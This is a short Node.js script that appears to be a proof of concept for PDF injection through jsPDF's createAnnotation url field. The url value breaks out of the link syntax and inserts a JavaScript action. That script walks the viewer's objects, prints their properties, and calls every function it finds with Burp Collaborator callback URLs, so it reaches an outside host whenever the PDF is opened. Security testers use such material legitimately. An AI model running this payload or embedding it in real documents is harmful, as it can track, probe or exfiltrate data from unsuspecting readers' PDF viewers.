const {jsPDF} = require("jspdf");
var doc = new jsPDF();
doc.text(20, 20, 'Hello world!');
doc.addPage('a6','l');
doc.createAnnotation({bounds:{x:0,y:10,w:200,h:200},type:'link',url:`/blah)>>/A<</S/JavaScript/JS(
    obj = this;
    for(i in obj){
        try {
            if(i==='console' || i === 'getURL' || i === 'submitForm'){
                continue;
            }
            if(typeof obj[i] != 'function') {
                console.println(i+'='+obj[i]);
            }
            try {
                console.println('call:'+i+'=>'+'='+obj[i]('http://your-id-'+i+'.burpcollaborator.net?'+i,2,3));
            }catch(e){}
            try {
                for(j in obj[i]) {
                    if(j==='console' || j === 'getURL' || j === 'submitForm'){
                        continue;
                    }
                    if(typeof obj[i][j] != 'function') {
                        console.println(i+'=>'+j+'='+obj[i][j]);
                    }
                    try {
                    console.println('call:'+i+'=>'+j+'='+obj[i][j]('http://your-id-'+j+'.burpcollaborator.net?'+j,2,3));
                    }catch(e){}
                    try {
                        for(k in obj[i][j]) {
                            if(k==='console' || k === 'getURL' || k === 'submitForm'){
                                continue;
                            }
                            console.println(i+'=>'+j+'=>'+k+'='+obj[i][j][k]);
                            try{
                            console.println('call:'+i+'=>'+j+'=>'+k+'='+obj[i][j][k]('http://your-id-'+k+'.burpcollaborator.net?'+k,2,3));        
                            }catch(e){}
                        }
                    } catch(e){}
                }
            }catch(e){}
        } catch(e){}
    }
    
    )/Type/Action/F 0/(`});
doc.save("output.pdf");
